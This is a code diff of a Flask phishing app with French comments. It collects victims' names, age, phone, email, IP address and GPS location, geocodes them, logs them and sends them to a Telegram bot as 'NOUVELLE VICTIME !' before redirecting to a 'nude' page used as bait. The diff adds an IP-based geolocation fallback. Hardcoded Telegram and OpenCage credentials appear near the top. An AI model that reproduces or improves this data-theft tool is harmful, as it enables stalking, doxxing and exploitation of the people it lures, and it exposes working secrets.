@@ -6,10 +6,12 @@ import threading
 app = Flask(__name__)
 LOG_FILE = "logs.txt"
 
+# === TES INFOS ===
 TELEGRAM_TOKEN = "8224979725:AAE-CrPxf_jjLotta0cq1j4hFf0jsDUCXss"
 TELEGRAM_CHAT_ID = "7301609294"
 OPENCAGE_KEY = "ba18fb5cd71a40deb4d74c4855961c71"
 
+# === FONCTIONS ===
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -21,7 +23,7 @@ def send_telegram(message):
 def log_data(ip, ua, nom, prenom, age, phone, email, lat, lon, adresse):
     with open(LOG_FILE, 'a', encoding='utf-8') as f:
         f.write(f"{datetime.datetime.now()} | IP: {ip} | UA: {ua} | Nom: {nom} | Prenom: {prenom} | Âge: {age} | Phone: {phone} | Email: {email} | GPS: {lat},{lon} | Adresse: {adresse}\n")
-    
+
     msg = (f"<b>🔔 NOUVELLE VICTIME !</b>\n"
            f"<b>👤 Nom :</b> {nom}\n"
            f"<b>👤 Prénom :</b> {prenom}\n"
@@ -47,6 +49,19 @@ def get_address(lat, lon):
     except:
         return "Erreur geocoding"
 
+def get_location_from_ip(ip):
+    try:
+        url = f"https://ipinfo.io/{ip}/json"
+        r = requests.get(url, timeout=5)
+        data = r.json()
+        city = data.get('city', 'Inconnue')
+        region = data.get('region', 'Inconnue')
+        country = data.get('country', 'Inconnue')
+        return f"{city}, {region}, {country}"
+    except:
+        return "Localisation par IP échouée"
+
+# === ROUTES ===
 @app.route('/')
 def index():
     return render_template_string('''
@@ -112,7 +127,12 @@ def capture():
     email = request.args.get('email', '')
     lat = request.args.get('lat', '')
     lon = request.args.get('lon', '')
-    adresse = get_address(lat, lon)
+
+    if lat and lon:
+        adresse = get_address(lat, lon)
+    else:
+        adresse = get_location_from_ip(ip)
+
     threading.Thread(target=log_data, args=(ip, ua, nom, prenom, age, phone, email, lat, lon, adresse)).start()
     return redirect(url_for('nude'))
 
